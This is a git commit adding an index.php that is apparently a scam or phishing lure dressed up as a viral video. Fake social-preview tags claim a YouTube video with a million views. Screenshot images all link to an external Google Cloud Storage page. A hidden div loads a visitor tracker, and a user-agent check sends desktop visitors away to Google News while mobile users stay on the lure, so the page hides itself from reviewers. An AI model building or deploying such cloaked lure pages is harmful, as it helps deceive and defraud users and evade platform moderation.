2d11dd95b71d29e9b64777d07755ed21899a5209
trinidad1994 <88596846+trinidad1994@users.noreply.github.com>
2021-09-08 07:29:56 +0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,44 @@
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta property="og:title" content="Video" />
+	<meta property="og:type"  content="article" />
+	<meta property="og:image:secure_url" content="822 online" />
+	<meta property="og:image:type" content="image/jpeg" />
+	<meta property="og:image:width" content="300" />
+	<meta property="og:image:height" content="300" />
+	<meta property="og:image" content="https://scontent.fhex4-2.fna.fbcdn.net/v/t1.6435-9/236290935_10161278832396754_8993500622663931100_n.jpg?_nc_cat=1&ccb=1-5&_nc_sid=09cbfe&_nc_ohc=5QQ_Rebr3PsAX-dudEU&_nc_oc=AQmUSs3Y-WPSV7QlYfylogOw6zjoM3ZLKXFF-juhM7nVGhoyhLF8r8yVgZAUWvVlvmM&_nc_ht=scontent.fhex4-2.fna&oh=e08ec60b45eb4feb066bd36e5eac0130&oe=615B2D59" />
+	<meta property="og:description" content="1.042.872 Views" />
+	<meta property="og:url" content="https://www.youtube.com/" />
+</head>
+
+
+
+
+
+<meta name="deepview-service" content="deepview-service">
+<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet" type="text/css">
+
+<p>&nbsp;</p><div class="separator" style="clear: both; text-align: center;"><a href="https://storage.googleapis.com/appvideoonlinepplus/index.html" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="345" data-original-width="600" height="368" src="https://1.bp.blogspot.com/--3RpuxXy20o/YRcysgRw-FI/AAAAAAAAAqQ/2VI2qPihkGYYmI812pnyKQwggZeebo6RACLcBGAsYHQ/w640-h368/Screenshot_1.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://storage.googleapis.com/appvideoonlinepplus/index.html" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="340" data-original-width="600" height="362" src="https://1.bp.blogspot.com/-OkI5pdrlEBc/YRcyskaCwBI/AAAAAAAAAqI/z4JjWjf0ZAMiQHeuTsM3i5tYc-ganYd8wCLcBGAsYHQ/w640-h362/Screenshot_2.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://storage.googleapis.com/appvideoonlinepplus/index.html" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="338" data-original-width="600" height="360" src="https://1.bp.blogspot.com/-JTY5tMc8eIY/YRcysvUWSMI/AAAAAAAAAqE/AZqneWBIRR8bzxkYL3Qp6JSYpwpfuUExACLcBGAsYHQ/w640-h360/Screenshot_3.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://storage.googleapis.com/appvideoonlinepplus/index.html" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="339" data-original-width="600" height="362" src="https://1.bp.blogspot.com/-RY4bJlMGPxY/YRcytHAlxdI/AAAAAAAAAqM/Ku9FaF0QzEMSTPXp6vSgTxPkFGe3BhMqACLcBGAsYHQ/w640-h362/Screenshot_4.png" width="640" /></a></div><br />
+
+
+<div style="VISIBILITY: hidden;"> <script type="text/javascript" src="//widgets.amung.us/small.js"></script><script type="text/javascript">WAU_small('1si0uzxbdr')</script></div>
+
+
+
+<script type="text/javascript">
+//<![CDATA[
+ function h(r, a) { var t = ""; if ("mix" == a) var h = 
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; else var h = 
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * 
+h.length)); return t };
+
+        var device = navigator.userAgent
+        
+        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
+        {
+         
+        }else
+{
+ window.location = "https://news.google.com/topstories?tab=rn&hl=es-419&gl=US&ceid=US:es-419?"+ h(23, '')+"/?ref=bookmarks";
+}
+//]]>
+</script>
